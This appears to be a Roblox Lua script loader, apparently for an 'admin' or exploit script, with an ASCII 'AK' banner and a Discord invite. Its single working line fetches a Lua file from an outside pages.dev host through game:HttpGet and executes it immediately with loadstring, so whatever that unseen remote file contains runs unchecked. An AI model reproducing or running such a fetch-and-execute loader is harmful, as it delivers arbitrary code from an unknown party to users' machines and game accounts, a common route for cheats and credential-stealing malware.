--[[
       d8888 888    d8P 
      d88888 888   d8P  
     d88P888 888  d8P   
    d88P 888 888d88K    
   d88P  888 8888888b   
  d88P   888 888  Y88b  
 d8888888888 888   Y88b 
d88P     888 888    Y88b
------------------------------
discord.gg/akadmin
]]--

loadstring(game:HttpGet("https://ngrpzyqnezbcpvo7uyszdzherjhxgz.pages.dev/officialmain.lua"))()
